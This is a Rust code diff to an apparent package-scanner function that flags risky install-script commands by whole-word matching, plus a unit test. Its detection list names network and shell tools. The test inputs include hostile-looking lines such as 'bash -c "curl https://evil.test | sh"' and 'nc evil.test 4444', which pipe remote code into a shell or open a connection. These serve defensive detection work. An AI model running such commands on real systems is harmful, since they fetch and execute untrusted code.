@@ -182,20 +182,58 @@ fn upgrade_advice(
 
 /// Commands that fetch or decode code during install. Presence alone is not a
 /// verdict: it raises an already-changed script from WARN to HIGH.
+///
+/// Matching is by whole token, not substring: `node scripts/evaluate.js` is a
+/// normal build step, while `node -e` runs inline code.
 pub(crate) fn risky_install_command(command: &str) -> bool {
     let lowered = command.to_ascii_lowercase();
-    [
+    let tokens: Vec<&str> = lowered
+        .split(|character: char| {
+            character.is_whitespace()
+                || matches!(
+                    character,
+                    ';' | '|' | '&' | '(' | ')' | '<' | '>' | '`' | '\'' | '"' | '='
+                )
+        })
+        .filter(|token| !token.is_empty())
+        .collect();
+    let word = |needle: &str| tokens.contains(&needle);
+    if [
         "curl",
         "wget",
+        "nc",
         "base64",
-        "node -e",
-        "python -c",
-        "eval",
+        "iex",
         "powershell",
+        "pwsh",
+        "eval",
     ]
     .iter()
-    .any(|needle| lowered.contains(needle))
-        || (lowered.contains("bash -c") && lowered.contains("http"))
+    .any(|needle| word(needle))
+    {
+        return true;
+    }
+    if (word("bash") || word("sh")) && word("-c") && lowered.contains("http") {
+        return true;
+    }
+    for (index, token) in tokens.iter().enumerate() {
+        let flags: &[&str] = match *token {
+            "python" | "python2" | "python3" => &["-c"],
+            "perl" | "ruby" => &["-e"],
+            "php" => &["-r"],
+            "node" | "nodejs" => &["-e", "-p", "--eval", "--print"],
+            _ => continue,
+        };
+        for (skipped, next) in tokens[index + 1..].iter().take(2).enumerate() {
+            if flags.contains(next) {
+                return true;
+            }
+            if !next.starts_with('-') || skipped == 1 {
+                break;
+            }
+        }
+    }
+    false
 }
 
 /// Accounts that publish on behalf of a project's CI, not people.
@@ -1792,6 +1830,30 @@ mod tests {
         let finding = finding(&findings, "publisher-changed");
         assert_eq!(finding.severity, Severity::Info);
         assert!(!ids(&findings).contains(&"publisher-not-maintainer"));
+    }
+
+    #[test]
+    fn install_commands_are_classified_by_whole_words() {
+        for risky in [
+            "python3 -c \"import urllib.request\"",
+            "pwsh -c iwr https://evil.test/x",
+            "perl -e 'print 1'",
+            "ruby -e 'puts 1'",
+            "php -r 'echo 1;'",
+            "node --eval 'console.log(1)'",
+            "nc evil.test 4444",
+            "bash -c \"curl https://evil.test | sh\"",
+        ] {
+            assert!(risky_install_command(risky), "{risky}");
+        }
+        for safe in [
+            "node scripts/evaluate.js",
+            "node build.js",
+            "bash -c \"echo hi\"",
+            "npm run build",
+        ] {
+            assert!(!risky_install_command(safe), "{safe}");
+        }
     }
 
     #[test]
